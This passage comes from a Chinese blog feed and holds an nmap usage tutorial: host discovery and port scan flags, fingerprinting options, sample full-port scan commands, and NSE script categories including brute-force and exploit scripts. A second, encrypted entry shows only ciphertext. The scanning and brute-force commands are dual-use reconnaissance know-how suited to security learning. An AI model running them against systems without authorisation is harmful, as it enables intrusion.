目前很多服务器都屏蔽了ping包, 因此这里可能造成一定的误报.</p><table><thead><tr><th align="center">参数</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">-sP</td><td align="center">通过ping来发现主机</td></tr><tr><td align="center">-sP</td><td align="center">通过ping来发现主机</td></tr><tr><td align="center">-P0, -Pn</td><td align="center">跳过ping发现过程</td></tr><tr><td align="center">-PS</td><td align="center">通过TCP SYN ping来发现主机</td></tr><tr><td align="center">-PA</td><td align="center">通过TCP ACK ping来发现主机</td></tr><tr><td align="center">-PU</td><td align="center">通过UDP ping来发现主机</td></tr><tr><td align="center">-PE; -PP; -PM</td><td align="center">通过ICMP ping来发现主机</td></tr><tr><td align="center">-PR</td><td align="center">通过ARP ping来发现主机</td></tr></tbody></table><h3 id="端口扫描技术"><a href="#端口扫描技术" class="headerlink" title="端口扫描技术"></a>端口扫描技术</h3><p>nmap提供多种端口扫描技术,一般来说一次只能使用一种扫描技术,但是sU可以和其他扫描技术并用.</p><table><thead><tr><th align="center">参数</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">-sS</td><td align="center">通过TCP SYN扫描, 也是nmap默认的扫描类型, 也叫做半开放式扫描, 每秒钟可以扫描上千个端口.</td></tr><tr><td align="center">-sT</td><td align="center">通过TCP connect扫描, 当-sS不能使用的时候, nmap将会采用-sT方式来扫描.</td></tr><tr><td align="center">-sU</td><td align="center">通过UDP扫描. 目前有很多服务都使用UDP协议, 但是UDP因为没有常驻监听端口, 所以很多人都会忽略.</td></tr><tr><td align="center">-sN</td><td align="center">通过TCP NULL进行扫描</td></tr><tr><td align="center">-sF</td><td align="center">通过TCP FIN进行扫描</td></tr><tr><td align="center">-sX</td><td align="center">通过TCP Xmas进行扫描</td></tr><tr><td align="center">-sA</td><td align="center">通过TCP ACK进行扫描, 主要用来发现防火墙规则</td></tr></tbody></table><h3 id="版本和系统指纹探测"><a href="#版本和系统指纹探测" class="headerlink" title="版本和系统指纹探测"></a>版本和系统指纹探测</h3><p>当端口连接上后, 通过报文包内容, nmap内置多种匹配规则能够发现目标端口和主机的服务以及系统版本等有效信息.</p><table><thead><tr><th align="center">参数</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">-sV</td><td align="center">打开版本探测, 结合-version-intensity 来设置版本探测的强度,0~9可以设置,默认为7</td></tr><tr><td align="center">-O</td><td align="center">打开操作系统探测</td></tr><tr><td align="center">-A</td><td align="center">同时打开版本探测和操作系统探测, 因此-A 是上面两个功能的集合.</td></tr></tbody></table><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-NMAP/1.png"></p><img src="/2022/04/24/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-NMAP/1.png" class="" title="nmap命令详解"><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>nmap主要提供两种输出格式,其中oN是正常的输出,oX是XML格式,可以用于后期程序利用. 为了简化,nmap还提供oA来简化输出选项, 这个可以输出所有格式.</p><h2 id="0x02-常用用法"><a href="#0x02-常用用法" class="headerlink" title="0x02 常用用法"></a>0x02 常用用法</h2><h3 id="快速全端口扫描"><a href="#快速全端口扫描" class="headerlink" title="快速全端口扫描"></a>快速全端口扫描</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -sV -sS -T4 target<br></code></pre></td></tr></table></figure><h3 id="详细快速扫描"><a href="#详细快速扫描" class="headerlink" title="详细快速扫描"></a>详细快速扫描</h3><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspectj">nmap -v -sS -A -T4 <span class="hljs-keyword">target</span><br></code></pre></td></tr></table></figure><h3 id="快速扫描指定端口"><a href="#快速扫描指定端口" class="headerlink" title="快速扫描指定端口"></a>快速扫描指定端口</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sV -p <span class="hljs-number">139</span>,<span class="hljs-number">445</span> -oG grep-output.txt <span class="hljs-number">10.0.1.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><h3 id="将扫描结果导出成HTML"><a href="#将扫描结果导出成HTML" class="headerlink" title="将扫描结果导出成HTML"></a>将扫描结果导出成HTML</h3><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">nmap</span> <span class="hljs-literal">-</span><span class="hljs-comment">sS</span> <span class="hljs-literal">-</span><span class="hljs-comment">sV</span> <span class="hljs-literal">-</span><span class="hljs-comment">T5 10</span><span class="hljs-string">.</span><span class="hljs-comment">0</span><span class="hljs-string">.</span><span class="hljs-comment">1</span><span class="hljs-string">.</span><span class="hljs-comment">99</span> <span class="hljs-literal">--</span><span class="hljs-comment">webxml</span> <span class="hljs-literal">-</span><span class="hljs-comment">oX</span> <span class="hljs-literal">-</span> <span class="hljs-comment">| xsltproc</span> <span class="hljs-literal">--</span><span class="hljs-comment">output file</span><span class="hljs-string">.</span><span class="hljs-comment">html</span> <span class="hljs-literal">-</span><br></code></pre></td></tr></table></figure><h2 id="0x03-Nmap脚本分类"><a href="#0x03-Nmap脚本分类" class="headerlink" title="0x03 Nmap脚本分类"></a>0x03 Nmap脚本分类</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">auth:</span> 负责处理鉴权证书（绕开鉴权）的脚本  <br><span class="hljs-symbol">broadcast:</span> 在局域网内探查更多服务开启状况，如dhcp<span class="hljs-keyword">/dns/</span>sqlserver等服务  <br><span class="hljs-symbol">brute:</span> 提供暴力破解方式，针对常见的应用如http/snmp等  <br><span class="hljs-symbol">default:</span> 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力  <br><span class="hljs-symbol">discovery:</span> 对网络进行更多的信息，如SMB枚举、SNMP查询等  <br><span class="hljs-symbol">dos:</span> 用于进行拒绝服务攻击  <br><span class="hljs-symbol">exploit:</span> 利用已知的漏洞入侵系统  <br><span class="hljs-symbol">external:</span> 利用第三方的数据库或资源，例如进行whois解析  <br><span class="hljs-symbol">fuzzer:</span> 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽  <br><span class="hljs-symbol">malware:</span> 探测目标机是否感染了病毒、开启了后门等信息  <br><span class="hljs-symbol">safe:</span> 此类与intrusive相反，属于安全性脚本  <br><span class="hljs-symbol">version:</span> 负责增强服务与版本扫描（Version Detection）功能的脚本  <br><span class="hljs-symbol">vuln:</span> 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067<br></code></pre></td></tr></table></figure><h4 id="脚本使用示例"><a href="#脚本使用示例" class="headerlink" title="脚本使用示例"></a>脚本使用示例</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nmap <span class="hljs-attr">--script</span>=auth xxx<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><br>nmap <span class="hljs-attr">--script</span>=brute xxx<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span>.xxx<br></code></pre></td></tr></table></figure><h2 id="0x04-附录"><a href="#0x04-附录" class="headerlink" title="0x04 附录"></a>0x04 附录</h2><ol><li><a href="https://gitee.com/link?target=https://nmap.org/man/zh/index.html">nmap官方参考指南</a></li><li><a href="https://gitee.com/link?target=http://tools.kali.org/information-gathering/nmap">kali的nmap教程</a></li><li><a href="https://gitee.com/link?target=https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/">nmap手册1</a></li><li><a href="https://gitee.com/link?target=https://highon.coffee/blog/nmap-cheat-sheet/">nmap手册2</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 工具 </tag>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络基础知识（二）</title>
      <link href="/2022/04/24/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2022/04/24/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="7b8f783030b38d9b004300329bd8b5fe314e1b36db4f35bd69381a4e8ccc6675">88c650cd571e5e72ae3aef8d89bdd0d3503200449cd60fa568544dfe1fdda2fe064fd90809442766d3c6e28822a5ddf794ec7028108c10ec33e2440650011463bf4c93d36cad2a31954f3acef6ab6beecff845a5931f20580ee2441c4b5d0312fc8b724d038355dec3a49b4334a89631818edd657808b39e432263153edca25c57430b7437ba13ec8e4dd9561cc4b82d3e1fe44f92703cc2bddae9a12f08b60e0c976c04c5d8be98aa81a715bccdc785cd6503c79969d9d803896c57345086045e7ac305d48f740ec17e5fcc3d21795e62ee6dc84905304a1739914a61c64b4eeea201065050e9b9101c696af8836c3c94c0f8c2fb150d1709a0ce62b35b8e3b30ed54f7d0b617a0046adbdee8be99933fdf1b11cde011de5638d225e668703354902395460bbad23f3a04a8a2109bb53ec2cdef3b603a7a0b620aee43e9957121ea450160d838a9669c092be6eb4b715c1034279262cfa417022844b1bfa291a7022285326c1234e3bdcd440a309340b2d573d4cdee7b913f6739ce85534555acb4e95c5c5050fa640b223577e5dcddb2a087d583a001f0c64034950ea29ec01a4037b1c9be2ffaa6b55a01f2f6072b40428fd65f7da764f5ef136f35ed13c273971dcecd0a593c2422ae1d55cbef6f45896c1d4a072f555ede7f3426b83a3c2912a2133c23be5bed8f8d30f80c93d1d2913c69c88dd69f14a55da398b2a2a25ed4d025edeec717f560455801adb5fb67b0a01f1cd855509c6375e064f62f9d8a7430dc21a1ce5f03f41436b2e44ea13a6608b805e8e5078dc05135b6c36d6c772ff13328c19ba98de115f90f3705d801c79f72120901349b87b615d89b35870c65a0821335762286f4d0bdd78763ee13ac1f52f851160a14a6029ee1a87a47da7f93b5f7be90c9bd7cb89073656d5297f02bc5bf2393bf35679d89bb5b4834ee4ca86b1840c906bccf113cebb9ba23f1a879b897c6b18821b59f3f6323bf201fe8bf908c126db512dfa051b3a4ab0c2a0f9af6898c268b1f157400e282c109b83e97e1db56e613d8a814a85780f11b57a47efc6086b60653f76bd9d0e5ff1be0689401c394361819c230dd4c58d96d8418a9a71bebb05dda6bfffd99ea3fcc8172b7389eee5cafb488a3f64976b5f0e6c71f58b984290f85b72b5a29e535bdb57e983bbc3db500e414b8c10c8ac02157c2a3b5dcdb9f942c1e3580aabc0d96bb466cdc2dad5b78834aa472495c0d5ba50beac3352f479b4c788ab86cfb4c39b32cf6a622394c1400f3dce5976f18439896bcbc3f29e270517f7e86154226b1cfbd3c5c21a70a5696c4a832001c118045aab79ea4710f742dac902ef811c9540315474b99467692ce2711ee44b49a0d02945f9d504cf82d6b8a1851c8bc8f2e2f362aeb381a2188c5bcc747664bc9a3ea05e2f716a8d187b6ac346d05c2c8320b338918d97ed72cb4d82096d4277e785f87e98b7b26fd779b262e1412259ba1a6da1cad5eb1f37fa832bc1adac848780c728baea54a2b88da2fd2f3f80ec110853fb4120af5edc5a02cb6f30a410aca85d473753b2612da6ff3b88e7cd4e863f60f13368578a6c04c083f3ecf0c9da3d4f3d0d1440d6734e2dff3c69d4d9fc9752e46d0e15578d6ccc9fe481a2041d9aafc6ecec1ed9f97f895cac09546628a83069de3831025762217c64594abd6313c8869dbeffec05fe5ee0eb2b5911f15b097dc08df99725eac5d3631b8bc8cca4fd5db19c1f5bb4236962e2be5ef379121ab9176e8490bde29f5aebedea4aaf77a80ff3a5051a4c132b9d0e21725e9f5b6ab48552d87a9446ecb5f4da56784dce41bd32a9557e77c01b435843f60f69332c070e12690c645fdd96064c9c22512d2d4f7f7d37041aba4a92021f0d8c2121d191443d06bd36436ca6b2dfbd7ebe2b3a17f65dbc1ab3b6ae878dc8e828c26f4b1dd7786d6aeccf36b86c451a4f29db2218bfc098b63535b9c3a199c6a747caf3ab227aa4909850fc385f35096ec87b4830aec08178fc8d3427907bc8cff5d30977f4810f50536b48c1dfc75501def6d69a2acc9486a960be1a118ac6e072ac7e8d273dd47d3d36c44066c7f10af5198d553d0188151ea39f2e383f51e0e292d1d632660f08234380002a981034509ff746123ef949085c2f73fb0c602817fd5481dbd1fd0ba660f672d18b25015c4a875439e48adbe7311eb10b8f85e230f76790868c6bfd5b1bf0ce73cbf296ab919fab939fbd4fad17e11349ebb6f02d449980e66fa21cd1069f3667360b614332926f25370a6e4dffdf485e060e71742d50543088d5f379be2bfdfe8e907236290fb559f50ffa7600501b3ad12b8c7df8f997535bdbf299ccd2bfef7b472ef90b72de8e7f3989f4cbdc54fc3277cbcbb85a15e4863d7b45cbb62f79ed42f5be54308598907269092af1de9dd0d76ecc227692559f61f6c0f804fb800ea4d6543ae6477e59017948f547b159246b645f5066480decadfc02feb9d680772233339b4697d2797b50a842dc7fd35d5df643b47ff4d7caa00dc743e2b3da5a97b42dff51287f93eb7c2edd161cf9296977f0c55e79eb1c3666f7aa2b8beb158efab827cebdd3434876270bff4527083d31a0b849d3fc8a0cf4b3caeb60566442a271fa97355feaeae83d943f0c5d5dc7601de9397e90533e8e28b381c5da2d327cb24a9e0aa1afc3e52b186f97cd36741f00a9283e29df0e95b615801e374d1505dd4da2662258cbe97a6430d4060130be59cf5c88c514760f7077f3a6a1ffa929b1f641ff34162ca4dd968a5ab4dcb186335bf26d47a24bbb2e2e4379a9f6101f956dde03b6e46579184dbfe2c6e6d9b3553cc0a31794ff4345a4ddea0c4ca9b2782e94f8a0f8e2445ba25661f6b8058c22e72c5a912286283ce266a7b6def74917f5ea3d788c876ef121d2b63952ef9bf63633f1533665b94a87c88d2c80540230b3e96aa6bd65be208112e1cf0bda96b13a43f89dcd9a137360d6746da6a391c3ed75bb104f130fee859f24670ad322c98a672c07e3a6cb7e535c9958c1e65e8e03ead0c03d82c6f2da3423d23365a49de92ec6357e3f58313038fb87bd4702cbf0dfa6a826c5e90fd3d79e9b567385e55b12076ce87d4bd3987c1a9503dd448a1484295d72d0a57efba85b5c37c3fd39f336d24d00454b19fac904eac1b765e49b410b44707f2501b8be1833f7e3ab1cd00a8a280f625bd0de82dafd761b439c279ef0fcbdb0dd74a9be44be989c7c0dcf279d7b16566de14a6253bfcb2092a7cbbdbc242e78be3fb4bbec26f45aed5e51a57a65c1ae9a688780f458b563ae24de71069049507c0e1818bfb38fb77c1b345788da79d58843a693853ead5df574457bcefef241500ce534a2044297cdcce3ebe353177e407b9584c0484f4fa209c8aa45d029c930d41501b40c16e572c9a669b0585595a8598c46874a6910f6b9706c721236762ff9754addf87dc415df635419764e039fc9e40da43907786ff03d822c334d49f1284cdebf60e9c242780ae892df733c390b881c151973d4bc4c580bc70b1279ae83f477bbd2ddded252e2ee8ca3a33573010da87de5223ff6f60e19f26505e6f0eb089c4100e6ee76af2fe64e92f0462004aae9c2f227136cdae235028dc7661f5ed8ebf689f839c934626ad1ed7fb1da88661a103ba7a9b21882c104efdd538b399316b3008c648b88c85048c6981004fc7c01b0e72314d2b44aa3bcb15d8c01a92adf5ae7e1029f334118f0cb1b9ea3ebec681e08edb0c2078b41a0283150a3a2e9f116aa95b9340f505cdca4387a91f7d8bd376a9f57acb54ac9774bdeff3a5460ef979c6dc28e93105e6ac66671a9717975b1064cb087e50f96ca98224d8f5026502f2833fa4864a6199ef66c68aee6120fade0ccebd6381e669f7e4fc7ffe0dfceedcde16191ca20b3a5fdb75ede86c000ebd45e64304fc8241c4536e169d1db7d119613c4e1c8a6ce864a8f5dcc9ec9875af728061b9e9fbe2df983ef9f64bc3a98fc42ded5b38e718110f08793564aa1f6af66e359c3dc3d8d0b3c506b56431c62b95c2566f67792cd7ce963ef1b31f56fe5bbc8e7318526f76c78c89b8448394e6801023c4ae30d6752a17d06b75119d9c239bee6e6fe26deb2eb6089075b6dc82c8f0ebf396b2ebb6793dca3336c6f97260bb293bda7b11750847b98fd5a897eca10db3e2289497049b9dd8500c12b087fd6a07db3012dc8e8f16a38c1ec96fc75f30f0f1b1f7efb0ba4c388e92de51352a5486c50b3329f6a62fb0587771d0e6eedde9a698e0745be200e4c1caa46a14db3746b68fbc26b4bb3ec3eb200711dc83c00ea5a5dd373111d62f88ad8e54bbcc2ea2c7c5a2c35c14eb06deb6aa63a771cd499cf9d201b738de46d8789f7945fd26bff7aa9f20f21d7c4adc1d75ec4b5e9cf2caa8c2fd504dd5b7587c2b0e263712abfc43cf9cc40863d764f0af2f29f08971cf72ba56e20706a9dc825f9e2315a5f508a62eb2a34613a8c2922f017112af3b8373a4b2fab3b238fbbe8b578d2d1c9765531309f43759f3c3d24b03529f3cfc3f0901fb78b542f1f040cfc9d4823e9e9cdcdd6a8da7d791d135b63d724c27774cfde89de721e6fd55e74e780d594c4bf61ba2f08a42648e50d4f59796b6650e2116cf7d4840d1ad69c8da5334e5e4eb503f38731a5f310b7c1673f8a9e78e869b8a30a1b3ed63323553b0cbf16aabaadfa2ae3e9499ca73bf333991ee90cd0636071eb5fbfc565722f1c1f378a87a542d1f5eb12ff898bf9183c8fe8ae79675b62d317c5967d3f72174a3912cca11d18dd8c068d61137a01d22afd83da7b27be27d12bba00426640b0315c7f099a7738827402396830cfc57868d677acb14e5f050d8a034a86cb0df2b7851a71093b50726c6c16c181ad032545f11a1ca8ea75076912a533b9c5898ed9e1dc6ad27744b727db4188fc03db1416f70dd3e5f6b72e33335286bd93609be7e2574b8da6addbc8f60d96449e06696949cdcf124f3786dfbbf76a7e5d5629e724149d8c9d407b185b0adab69487c765d5d6db18981616369c9d59e4e9bd4003ca39988367ee13f6ae01280b89fdde3287534288b0b5d9a2a852b6a42a3314091f347b5e219555668dff761de72051b81a55752dfe60e03346431c64128cef0130cc4a9e164099fe7c6b4a1e263c81b651d87262e3f78365d9d170af907854076b0901145d216b5c2b6ce5c6a4b47836107e1e63f878c7eabb1d57d7573d8d6172e4b5bad4d9179f487a8acc64c9b558794f834028407c049036d055079f968a2e62d0a03d674f7e852c31504d4a65511bd77846de4245b395b260fcf77791d06077fe6b321df580789dfa8475510fe72e63c8b0bedd4401de7d940572ee51d573b54bc0c01251cbe399715cc16996f0adcab838a5c8498209d810e85b8dccba91f0983537e32bbe09031456077209726e73fbd8c7b2633511ceab7ea398d9db03b9fdef4a2a810cd04d84d767e2cfb82483c80a9136929590270aa8cbbed318b6831364d3860a49c6aa769ca315197b4348a370a24861f622822d8316dca9ab92d7cea0bc3eafa6aa27dd8ebf97d851b62925122ea6a4a1f486ab569af2774933e0e53eb7ac8b28342b94049e3bc07e7b7feec7d5f7f6af535dd66056c4fc283ed09ffbaeebabdf57652fee3eb9e4aa0c4dc7823e43929b4f48bf644f404fdef82ec6839574e28c038ac94c0cbd2204c08f56699b395070374e810619ad7176194b273e77b188e8c998cef3b6131b738e3f0019d57ebed0f8682ed8da423a0b48bcf79d89d1535fc6c8658f35a8ef0f859c3b5a7bd8cf1da8a0e70dc76c559f930e3c2f14b83adb28a9836d1ed8f7c35454e2115997e509727045dae1e79e0ccfc4a1fe457098007771554dc33daf490358a7712568a0b722a22d3a63e8c9b3115a944500907d6590eba8ffefd2757a7d9e2ceea8cf3460a9e6cc3c1eb8ff28bb8057c3e7085d775f8ad1f62ef93bf6bfb54b798074c55fb243837bf6781784d833c34626f9651e5ee271890c383c0f659aa7fcb44013cc0fdf2993aba7f83ec71441bcb4866e31f67c35f7724ac3c2947dde38cdc0946be499a326d8da1a55f76d233e6c5c943acafe5dad20d2855155f3cd8449a2ff434d6595194439fff3b93456d1d460b87ac599e4be2a0a49f066047b070c613d945632593e4838d717fd8d6c950b18eb6e736a4f30b029574c6b35dc883a99dd3f94533c4d95560dc1ba72bcd2d10dcdf9106253c9ef61b9d08e2185c50e7c04e8dc06be32b214f1d33dfdd6393825562515de7ec783fa49456abf29f527ea0059a1b47bd03844d2cb0c69960704c689f2ff744c62aab11ab41e7dbf96db4f355a0be5ae65d0d8639de8a9c886c3b63ed5a91089143949e99a4486167c9b15776a6bfeffd9daed78119d8867d020389ed6763209844acfb932efbe7e57aad7a584d93a4570b2bd16c31fcdff06347cc59b765d1ce21dc72a35547117bd93d1b096346ad164aba7a540c4fefa897a4341a1f842b04c09a57d6bf8106e66643180a01ffe4d45240eb8826c797eeb9a6e9e1b948dc81ab8809ed5698b6da35fae8cc3a78c0d67130627790bcbfccc322a02ab853f08c30f4be9b3cdc62fdd709f5fb38c626922276f69c37df2212052d9a735b3b063aeabb0de63494e63280319e319698d36401a2cf9dc2ad100c698e737a5cfd7bfbcae5e191162e7e7ada23569caa0e7d36eeeffd0ead7d28b1151a8b03ed9bd4953340a83b6f5f1d8ff8138fe33b61d4529acccb58f813a3f6cf832716070f0cff7fc59942325d03020a4cbe1f1b94185dd563a724ac26ae8d1d2f64c99c33f74f0f615590245dbc37e6de94f650d2daa6e014c85aada5d05f2d79a910102abd523090e93cec2814a7275b9f99e95174f29c4723ef81161c07691540cf0612ecd478da8c5149a9d7c8506058d811e1cea0041937279dca9086a4f46ecb21da2c8da9330152105c029f1cdb1f244d8c503bb8a2ab77f82b1b2420f207ad5891015f21123653c8b417afb4c0fed30aca7c1a5cf84dc7cf20b2e6787990a098074de005cb07011bfac872dc5ce782e75d127a85066359f82c888610ec5d8ca5e3bbc080c0c728b44f0efa16b87e43faf0fd388c4e372f00e74bf2a6888c46a5b3bef219509d79e2341613d125a9f83fd5eb0cb2cb3ee4ae32111b38ce83868185f20bd96944877e9bd5136523b766b9d50b398f38d513ed0c94b4c9fc1994a2628c5c65c42e3008afbc4dfa1e43bd9f1637c6bcc01b75c8c9d9f4964aca6fe09b468751a27d78a7b23d5e63918859d19e2965137d705fa75f5cb06b6271a60bb6a8a3906956de29c04a74c4f57bd471f26d1c78a6a91b2c33fc998cbeeb31696b86cef5073433fc798917b8b00e6b72063843c0a3585084bf069de21853a9d8b52c149191efa283ad70aca2f899006567148633a41b7b010bb61976fa756819d9742438eeba36b59d99d26db7469736bf54c60ef97a88316bf247c2471206f123fae52cd767dd0b18a87c37ec1efbba63bfb5bc916a8a75ef7fa06cf799b133b8a02bff697662cb98257a3271c46d60b26fc2849b01433cf18df45169c1dd585cb6c69fb131ccc8e6c8ed5f76a328380b629a63d1993c8e2ffcc78b9e7aaf99288c19a6ca2201e0180ba678ccfe74c6a4a7a9299d3c8849ddd446bf40f79c784d72767c440a384460e53126c2cd5c36a049b5c3e1f6dd4827550facf539b4bba7b1ec307b14bda74098222f937f61e51ee26aaa22e2bb475d4102dffb522a26d7e2fdc4639969c182637a915f46f4debd62d4ee11d107d6cf0897a061eaca663e805f24da3f1ba54f1e8c54d60b9a9c7d51c35eaf49a5451b5865c1abb8428311be5a9106ea102f066870b5dc30ad932742df289a7b6432ee08e30868ceae59ca3e6b020b37807377c49e7799b5b75b7be2cf36519946cac47e73906120a7b210aec7ccdb1d4b18345a4a8caac4cc7c2b131588399634d618cb09152fce604f4ea4d47c7ac4008c0fbdf7cd329d87692fcaae19fe63648bc4d3711d97daa2be4064f23b4d538029c72f4b8ca37052904a9e2702e9802e61c160176df994a6190c0042af0d62b89ee0ad4caa691b89b731e6af0225b37642ec16e8b262a3734524284077fa30f1e452e5d12435317eb8484e9901d3982101742f7f1f4f0a4a368d4d82a574337ae2a52920694f7029a807fb49908ab2818be7acfba932437f03159993272a118a511d7ea187a2a5a7c475aaa420812e778ff63a0bf395163a3b6cf20c9d44d590661cd81ca41c57440803128a88280309d915b22bc75e1624462e8b64773cbbc4a0dad46e3ba3561eeff6ad9d47e78feec5059b1d4eb94c35a6ce2ce67a5055b60dd853084cf5774ef9c8f3a1f55d8585b4b9d43cc35bfac144d4a5a0fab4a2d5d1c5becdf528a45de578cb55092f7f8c74956530f6a34c7a6e0f7d726f6361df894f0ce3325e80121f9f72d166bfd7de37775ffac1f174dcc5bf5f4893038206772171d1b6b252fb3e7a55a1a08b9ea7a649015a0416a0b072af7d602870fb9155741d5332a6925eabd25f5c5ccfd282f328deb222098d5bb65f5d1ca9f7bc1242fcaeebf37aace6670dfcc1c4db8a0100e98fd3ccb044ceb67c06ab658e2c3c588fe832888589fc43ed4d427b58809d0e9f794cbd39908c360056e0344389a49bde417993f219077ba1b8ed7e85c747c30148ad7d5b8236b7dc3ce4789c26a8fe5a5e1d49bde8ae897bb24ba0fce077937d201a3585885a9c291b9092ae7fd2779d52d22fdf04d34f17a6e51b50893a6b9eaf1e659c58549947a956008da7bd9b1f628537cb01bdf891f49a1949cd9673c2d3eba02237a563a0ac72cf9ab42f57baf62b739965a0b38664b85fc9cffabc428fb0fcba67ec321444f3cd5723fa6d1947c17e1cef395d435e516636e72cdc2e597509906430c7ae7b7aba2257339b42c1739d6c9b850c70f456270d743f18755fa85065254ebdc08bbbad4e837f92518a78001044d7171c50b8185a34ddb799199bcbb463edd0abb462be8aff630aed94f61a0da007420191f24ecb252e9a16fe367b45082133f5db2014a9eda3ba66c89d3846266d8702178c06dee689f42c18a6340908c914ecfca6decc797449dd0efb4f1d9a111d8e14a1d79fbe0b77f5e69f8a55bf56274edb139e6538a500c1ee751214e134017858e5fb6cc7de1ef2544aab9d3fe40663a560e744668c284ac3d12d91f8c8fb0514d631772c45ccec1d3cc55c8ec78e717121a93b9a89ea89942cb3737819823f09d80ab936553e564e3561a278da71a79f7e7ff3e34cc96fb9a6343ca4ca4e7aeee1b475f9db57294822cbd03e48f084d938f9d039c453c6e15371f8504d0a5d1c055379790b688f3f96cf9c49632f225c86bbaf0a3654282149b7e88a8e85e48c547791afd8dccbab5ffb06fb291c58c3619df1a4b3cc98504fe00a8afaece326566780a6996d38daefacbd7df3cc3145792ae2369ec8b5e518f9ec4b825105f8b11bdec815ef06cf89c7dd29142a97174fa1e1b647fb107f4555481ccc27e0271cfccbaf078f998e41499f9b6b10aa8d86a32953fa53090a7c8c859f327ab5687e69bb10c347cacc818db883ba45790cc9ae89ce1987a7fd4618d85fb51b8da9a0ec2a5e96e483adb28759b54070b8c3654c90e415d3d143447d37aaeb823ab2bbc3eeefe442fb74511c484105194696189653dbb8b5bfdfaf5b6fa0b16f25b9434299acc12dc031a41f0f485ba0499347edd6a64e9a78940ca659e7ad2a9930db9e3590305cd735e29c19ca8fdc3e4e75c448fd6842d03e5fac94be42619e3481c3c3fc296304ea773184e68e98b25e2b4cd28de5d84c139e6dcbd7d1171f34266762b20840837520729df0963496b05846566da0da31dcb8daca32acbc01002869d67ce394753255ef693287306d324c7462fd41713b5bfc3f8ac9e75311520cfaa592960dddb7f032d602d7a1aeefb425321f97dfdb8109a9667cd7f36cde470182d769e87ed1d299c81532c1886575ccfb802120d171ef06ee5102f790f8675bc90e2487f0c0a79c9cc942b0596345a742263b7b81a3f54809af85a996a525d79d98a4932c0f52d633484611f9b543f444a726047d683a0545d38d9d68bb1002282f3afe17cb12803bcf15d8fba6da0dfc968a84a22fbe2073aa086db4533ae404e08a2018dd53d4fb73c1fbea687d6fca3ffcd56caa12e705aa181a5d8937042ba17162d46614bfcd6a3bc4daa9642244b4488d68b2efac9eab6a7e42f5c01f17bb2ab28303d70bcb844d5307ab820ffc95a53bee77beb85bdfa35d494ec4305d39949742054e86aaa240e2dc6496710b934dced30a9e463401a063accebdb322fdfe4eeda5ea8e0bceb40082e03040f4396bb3776c98d99bea4c8ef01ba0f917e557cf3a3d4701698a932fe13d5ea5f91a3b3005a0dafd31831bd64718820d43763fb8b618e73e84393c3e6b076b7c637521939561f0a415697945d66ed7dde116ef82debb87ace97aba829e7bc334d8eeb189d235ab2ddab64498ca17726c851d4f4d4db2c212840ff0f2fffa2ced2ae7bc48c2a02cc64208d50673708400402fec87d53fe23968e90de21a97c7fecc80b17979703c2e6de5a24115dc33d4ba9119a6400967be6f9c894d0c0d99d9205baa0ece98c19f8487766e7495fc3baa6d4f58dcaeda287ea2bcf0e87b7a0d9fd6ac256ae0c2eedff0b9b90a72bcec0686f0001af953b9ba04d3b6b2873c57489f4a6992f8430c6fd57b964d5f0ce107f367b73faa1cf04fd517dc9125346fd61afca333f19b994eb6aceba547887c11210010305f67c0b35be58a3537b208288a1f73f08078c0c1eba4f279ab83c66de8aff98faef5e7fa5877c7e545b209c261f1341deb3a7bc19ceec46f146332e4b624d7207aaac266bee6c56faf5f1aa7762c99e07ab653ec6405c95407cc0682c8cc030a091465dfe680a06c2913c388bc46f3225ddcf6c8fbe3381ff03545ee7ecd6eaf47a3937a09a0cb6747da2049e774bba884df2e2b6ad3ac825c309d5584007ded43c965063f815c76d26f33526e49b46fbfd7398c35aac2f8cdb11a671206d3aff65d12dfb562ab97d089323f89550c895001ba43084ac72fb6